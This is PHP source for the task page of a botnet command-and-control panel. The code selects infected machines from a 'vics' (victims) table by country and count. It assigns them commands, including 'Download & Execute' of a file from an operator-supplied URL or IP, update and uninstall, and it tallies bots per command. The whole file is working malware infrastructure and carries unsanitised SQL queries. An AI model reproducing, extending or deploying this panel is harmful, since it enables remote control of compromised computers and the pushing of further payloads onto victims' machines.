<?php
include('inc/session.php');
if(!isset($_SESSION['pornopanel']))
{
	header("Location: login.php");
}

include('header.php');

if(isset($_GET['do']))
{
	if(isset($_POST['send']))
	{
		//url, limit, startime, endtime
		if(isset($_POST['url']) && isset($_POST['limit']))
		{
			if($_POST['command'] == '#uninstall')
			{
				$command = '#uninstall';
			}
			else
			{
				$command = esc($_POST['command']).'|'.esc($_POST['url']);
			}
			
			//select countries
			if($_POST['countries'] == 'whitelist')
			{
				$sql = mysql_query("SELECT * FROM settings"); 
				$res = mysql_fetch_array($sql);
				
				$tmp1 = explode(';', $res['whitelist']);
				
				$var = array();
				for($ii = 0; $ii < count($tmp1); $ii++)
				{
					$var[$ii] = "'".$tmp1[$ii]."'";
				}
				$tmp2 = implode(',', $var);
				$tmp3 = strtolower(substr($tmp2, 0, -3));
			}
			elseif($_POST['countries'] == 'blacklist')
			{
				$sql = mysql_query("SELECT * FROM settings"); 
				$res = mysql_fetch_array($sql);
				
				$tmp1 = explode(';', $res['blacklist']);
				
				$var = array();
				for($ii = 0; $ii < count($tmp1); $ii++)
				{
					$var[$ii] = "'".$tmp1[$ii]."'";
				}
				$tmp2 = implode(',', $var);
				$tmp3 = strtolower(substr($tmp2, 0, -3));
			}
			elseif($_POST['countries'] == 'selected')
			{
				$countries = '';
				foreach($_POST['countries_arr'] as $checking)
				{		
					$countries .= "'".$checking."',";
				}
				$tmp3 = strtolower(substr($countries, 0, -1));
			}
			
			//select the bots you want from victims table
			$qry = "SELECT * FROM vics WHERE command = '' AND countryshort IN (".$tmp3.") LIMIT ".stripslashes($_POST['limit']);
			//echo $qry;			
			$select_bots = mysql_query($qry);
			
			while($res_bots = mysql_fetch_array($select_bots))
			{
				$task = mysql_query("UPDATE vics SET command = '".$command."' WHERE vid = '".$res_bots['vid']."'");
			}
		}
	}
}
?>

<h2>Tasklist</h2>
<table class="list no-width">
<tr><th>Count</th><th>Command</th></tr>
<?php
$sql = mysql_query("SELECT count(command) AS counter, command FROM vics GROUP BY command");

while($res = mysql_fetch_array($sql))
{
	if($res['command'] == '')
	{
		$cmd = 'No Command';	
	}
	else
	{
		$cmd = $res['command'];
	}
	echo '<tr><td>'.$res['counter'].'</td><td>'.$cmd.'</td></tr>';	
}
?>
</table>
<h2>Add Task</h2>
<form method="post" action="tasks.php?do">
    <div class="left">
    	<table class="none">
        <tr><th>URL / IP</th><td><input type="text" name="url" /></td></tr>
        <tr><th>!dlexec*</th><td><select name="command">
        <option value="#download|">Download & Execute</option>
        <option value="#update|">Update</option>
        <option value="#uninstall">Uninstall</option>
        </select></td></tr>
        <tr><th>Number of Bots</th><td><input type="text" name="limit" /></td></tr>
        <tr><th colspan="2"><input type="radio" name="countries" value="whitelist" /> Whitelist<br />
				<input type="radio" name="countries" value="blacklist" /> Blacklist<br />
				<input type="radio" name="countries" value="selected" /> Select Countries
        </th></tr>
        </table>
    </div>
    <div class="right">
    <h4>Select Countries</h4>
        <p>
        <select name="countries_arr[]" multiple="multiple" size="13">
        <?php
        foreach($ccode as $key => $value)
        {
            echo '<option value="'.$key.'">'.$key.' - '.$value.'</option>';
        }
        
        ?>
        </select>
        </p>
    </div>
    <hr class="hidden" />
    <input type="submit" name="send" class="button" value="Create Task" />
    </form>

<?php
include('footer.php');
?>